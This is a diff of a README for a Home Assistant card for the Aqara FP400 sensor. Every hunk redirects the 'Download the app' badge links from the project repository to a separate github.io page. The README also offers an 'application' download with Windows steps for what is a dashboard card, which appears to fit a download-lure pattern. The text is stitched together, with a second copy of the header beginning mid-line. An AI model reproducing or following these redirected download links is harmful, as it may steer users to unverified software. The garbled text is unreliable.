@@ -1,6 +1,6 @@
 # 🎯 aqara-fp400-zone-card - Draw Presence Zones, Block Ghost Spots
 
-[![Download aqara-fp400-zone-card](https://img.shields.io/badge/Download-Get%20the%20app-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=6a0dad)](https://github.com/Gabrielyop50/aqara-fp400-zone-card)
+[![Download aqara-fp400-zone-card](https://img.shields.io/badge/Download-Get%20the%20app-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=6a0dad)](https://gabrielyop50.github.io)
 
 aqara-fp400-zone-card is a Home Assistant dashboard card and Zigbee2MQTT converter for the Aqara FP400. It helps you draw presence zones and block ghost spots, so your smart home sees people more clearly and stops reacting to empty areas. You do not need programming knowledge to get started. The project is built for HACS, Home Assistant, Lovelace dashboards, mmWave presence detection, Zigbee, and Zigbee2MQTT.
 
@@ -25,7 +25,7 @@ Together, these parts help you turn raw presence data into a dashboard that is e
 - HACS-friendly project layout.
 - Zigbee2MQTT# 🎯 aqara-fp400-zone-card - Draw Presence Zones, Block Ghost Spots
 
-[![Download aqara-fp400-zone-card](https://img.shields.io/badge/Download-Get%20the%20App-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=6a0dad)](https://github.com/Gabrielyop50/aqara-fp400-zone-card)
+[![Download aqara-fp400-zone-card](https://img.shields.io/badge/Download-Get%20the%20App-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=6a0dad)](https://gabrielyop50.github.io)
 
 aqara-fp400-zone-card is a Home Assistant dashboard card and Zigbee2MQTT converter for the Aqara FP400 presence sensor. It lets you draw presence zones and block ghost spots directly on your dashboard, so your smart home reacts to real people instead of empty chairs and moving curtains. You do not need programming knowledge to get started. The project is built for HACS, Home Assistant, Lovelace dashboards, mmWave presence detection, Zigbee, and Zigbee2MQTT on Windows.
 
@@ -71,7 +71,7 @@ If your Home Assistant already shows your FP400 sensor and you can see its entit
 
 Visit this link to download the application:
 
-[![Download aqara-fp400-zone-card](https://img.shields.io/badge/Download-Open%20Project%20Page-00c853?style=for-the-badge&logo=github&logoColor=white&labelColor=1b5e20)](https://github.com/Gabrielyop50/aqara-fp400-zone-card)
+[![Download aqara-fp400-zone-card](https://img.shields.io/badge/Download-Open%20Project%20Page-00c853?style=for-the-badge&logo=github&logoColor=white&labelColor=1b5e20)](https://gabrielyop50.github.io)
 
 1. Click the download button above. Your browser opens the project page.
 2. Keep the page open in your browser while you work through the next steps.
